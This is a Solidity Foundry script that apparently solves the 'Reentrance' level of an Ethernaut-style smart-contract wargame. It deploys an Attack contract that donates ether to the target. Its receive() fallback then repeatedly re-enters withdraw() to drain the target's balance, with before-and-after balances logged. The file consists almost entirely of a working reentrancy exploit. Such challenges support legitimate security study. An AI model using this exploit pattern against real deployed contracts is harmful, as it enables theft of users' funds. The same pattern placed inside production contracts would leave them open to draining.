// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/levels/10-Reentrance/Reentrance.sol";

contract ExploitScript is Script {
    Attack AttackContract;
    Reentrance level10 = Reentrance(payable(0xa39E118398bEd4333bcF4346b8b58986F665AcF0));


    function run() public {
        vm.startBroadcast();
        AttackContract =  new Attack();
        AttackContract.donate{value: 0.001 ether}();
        console.log(address(level10).balance);
        AttackContract.hack();
        console.log(address(level10).balance);


        vm.stopBroadcast();
    }

}



contract Attack {
   Reentrance target = Reentrance(0xa39E118398bEd4333bcF4346b8b58986F665AcF0);

   function donate() public payable {
       target.donate{value: msg.value}(address(this));
   }
   function hack() public {
       target.withdraw(0.001 ether);
   }

    receive() external payable {
       target.withdraw(0.001 ether);
   }
}


